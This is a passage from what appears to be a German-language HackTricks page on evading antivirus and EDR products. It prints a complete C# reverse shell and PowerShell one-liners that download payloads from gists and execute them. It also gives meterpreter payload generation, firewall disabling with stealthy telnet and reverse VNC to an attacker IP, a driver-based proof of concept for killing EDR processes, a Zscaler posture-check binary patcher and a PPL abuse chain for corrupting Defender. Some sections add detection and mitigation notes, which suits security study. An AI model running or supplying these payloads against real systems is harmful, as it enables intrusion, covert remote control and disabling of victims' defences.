Dabei wird ein **neuer Opferprozess gestartet**, dein post-exploitation Schadcode in diesen neuen Prozess injiziert, der Schadcode ausgeführt und nach Beendigung der neue Prozess wieder beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses stattfindet. Das bedeutet, wenn bei einer post-exploitation Aktion etwas schiefgeht oder entdeckt wird, besteht eine **viel größere Chance**, dass unser **Implant überlebt.** Der Nachteil ist, dass du eine **größere Chance** hast, von **Behavioural Detections** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hierbei injizierst du den post-exploitation Schadcode **in den eigenen Prozess**. Auf diese Weise vermeidest du das Erstellen eines neuen Prozesses und dessen Scan durch AV, aber der Nachteil ist, dass wenn bei der Ausführung deines Payloads etwas schiefgeht, die **Wahrscheinlichkeit deutlich höher** ist, dein **Beacon zu verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, sieh dir diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem der kompromittierten Maschine Zugriff auf die Interpreter-Umgebung gewährt wird, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist.

Durch den Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share kannst du **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Im Repo heißt es: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP etc. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten reverse shell Skripten in diesen Sprachen haben sich als erfolgreich erwiesen.

## TokenStomping

Token stomping ist eine Technik, die einem Angreifer erlaubt, das Access Token oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren, wodurch dessen Privilegien reduziert werden, so dass der Prozess nicht beendet wird, aber nicht die Berechtigungen hat, nach bösartigen Aktivitäten zu prüfen.

Um dies zu verhindern, könnte Windows **externe Prozesse** daran hindern, Handles auf die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren und es dann zur Übernahme und zum Aufrechterhalten von Persistence zu nutzen:
1. Lade von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer auf dem Opfer stumm aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome Remote Desktop-Seite zurück und klicke auf Weiter. Der Assistent wird dich dann zur Autorisierung auffordern; klicke auf die Authorize-Schaltfläche, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Hinweis: der pin-Parameter erlaubt es, die PIN zu setzen, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr komplexes Thema; manchmal musst du viele verschiedene Telemetrie-Quellen in einem einzigen System berücksichtigen, daher ist es in reifen Umgebungen nahezu unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist auch ein großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welcher Teil Defender** als bösartig erkennt und es für dich aufsplittert.\
Ein weiteres Tool, das **das Gleiche macht, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Webservice unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 wurde Windows standardmäßig mit einem **Telnet server** ausgeliefert, den man (als Administrator) installieren konnte durch:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Stellen Sie es so ein, dass es beim Systemstart **startet**, und **führen** Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet-Port ändern** (verdeckt) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort bei _VNC Password_
- Setze ein Passwort bei _View-Only Password_

Verschiebe dann die Binary _**winvnc.exe**_ und die **neu erstellte** Datei _**UltraVNC.ini**_ auf dem **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es bereit ist, eine reverse VNC connection abzufangen. Dann, auf dem **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unauffällig zu bleiben, darfst du ein paar Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das config window](https://i.imgur.com/rfMQWcf.png)
- Rufe nicht `winvnc -h` auf, da sonst ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte jetzt den Lister mit `msfconsole -r file.rc` und führe die **xml payload** damit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C# Obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von Python zum Erstellen von injectors — Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Bereich deaktivieren

Storm-2603 nutzte ein kleines Konsolenwerkzeug namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte platzierte Datei ist `ServiceMouse.sys`, das Binary ist jedoch der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er selbst bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. Service-Installation:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem User-Land erreichbar wird.
3. Vom Treiber bereitgestellte IOCTLs
| IOCTL code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (wird verwendet, um Defender/EDR-Services zu stoppen) |
| `0x990000D0` | Beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Treiber entladen und Dienst entfernen |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum das funktioniert**: BYOVD umgeht vollständig user-mode Schutzmechanismen; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmaßnahmen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Liste blockierter verwundbarer Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Dienste und alarmieren Sie, wenn ein Treiber aus einem global beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Zscaler Client Connector Posture-Prüfungen durch On-Disk Binary Patching

Der **Client Connector** von Zscaler wertet Device-Posture-Regeln lokal aus und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Posture-Bewertung erfolgt **ausschließlich clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Ursprüngliche Logik gepatcht | Ergebnis |
|--------|------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung compliant ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Unsigned oder modifizierte Binaries können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Policies definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL) um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höherstufige geschützte Prozesse sich gegenseitig manipulieren können. Angriffsseitig: Wenn man ein PPL-enabled Binary legitim starten und dessen Argumente kontrollieren kann, lässt sich harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL unterstütztes Schreib-Primitiv gegen geschützte Verzeichnisse verwandeln, die von AV/EDR verwendet werden.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Das signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn es als PPL-Prozess gestartet wird, erfolgt die Dateischreibung mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwenden Sie 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu verweisen.

8.3 short path helpers
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergebe das ClipUp-Log-Pfad-Argument, um eine Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurzpfade.
3) Wenn die Ziel-Binary normalerweise vom AV während der Ausführung offen/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor der AV startet, indem du einen Auto-Start-Service installierst, der verlässlich früher läuft. Überprüfe die Boot-Reihenfolge mit Process Monitor (boot logging).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können die Inhalte, die `ClipUp` schreibt, nicht kontrollieren, außer deren Platzierung; die Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Admin/SYSTEM, um einen Dienst zu installieren/zu starten, sowie ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Bootzeit vermeidet Dateisperren.

Erkennungen
- Erstellung des Prozesses `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn er von nicht-standardmäßigen Elternprozessen gestartet wird, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass verdächtige Binärdateien automatisch starten und konsequent vor Defender/AV starten. Untersuchen Sie Dienst-Erstellung/-Änderung vor Defender-Startfehlern.
- Dateiintegritätsüberwachung auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: suchen Sie nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL-Level-Einsatz durch Nicht-AV-Binärdateien.

Abhilfemaßnahmen
- WDAC/Code Integrity: Beschränken Sie, welche signierten Binärdateien als PPL laufen dürfen und unter welchen Elternprozessen; blockieren Sie ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie die Erstellung/Änderung von Auto-Start-Diensten und überwachen Sie Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender-Tamper-Schutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf Binärkorruption hinweisen.
- Erwägen Sie, die 8.3-Kurznamensgenerierung auf Volumes, die Security-Tools hosten, zu deaktivieren, falls kompatibel mit Ihrer Umgebung (gründlich testen).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Referenzen

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
